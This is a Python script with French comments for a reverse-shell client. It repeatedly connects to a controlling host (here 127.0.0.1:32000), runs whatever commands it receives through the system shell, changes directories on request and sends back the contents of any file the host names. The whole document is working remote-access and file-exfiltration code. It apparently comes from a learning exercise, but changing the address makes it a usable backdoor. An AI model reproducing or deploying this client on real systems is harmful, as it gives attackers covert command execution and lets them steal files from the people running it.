import os
import platform
import socket
import subprocess
import time

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

while True:
    print(f"Connexion à {HOST_IP}:{HOST_PORT}")
    try:
        s = socket.socket()  # A chaque reconnexion on doit initialiser le socket
        s.connect((HOST_IP, HOST_PORT))
    except socket.error as e:
        print(f"{e} ! Reconnexion...")

        time.sleep(4)
    else:
        print("Connexion réussie!")
        break

while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if command_data:
        command = command_data.decode()
        
        command_split = command.split(" ")

        if command == "infos":
            response = platform.platform() + " " + os.getcwd()
            response = response.encode()

        elif len(command_split) == 2 and command_split[0] == "cd":
            try:
                os.chdir(command_split[1].strip("'"))
                response = " "
            except FileNotFoundError:
                response = "Erreur: le dossier n'existe pas"
            response = response.encode()
            
        elif len(command_split) == 2 and command_split[0] == "dl":
            try:
                f = open(command_split[1], "rb") # rb = read binary (car on peut avoir tout type de fichier (img, txt,...))
                
            except FileNotFoundError:
                response = " ".encode()
            else:
                response = f.read()
                f.close()
            
        else:
            result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True) 
            response = result.stdout + result.stderr

            if not response or len(response) == 0:
                response = " " # Tjs important de renvoyer au moins 1 caractère car le serveur attend une réponse.
            response = response.encode()

        #1000000000000 13 octets 1 Tera
        # handshake permet de gérer une réponse trop grande
        data_len = len(response)
        header = str(data_len).zfill(13) # zfill(13) permet d'avoir une chaine de 13 caractères afin d'avoir tjs la meme longueur
        print("header: ", header)
        s.sendall(header.encode())
        
        if data_len > 0:
            s.sendall(response)
    else:
        break

s.close()
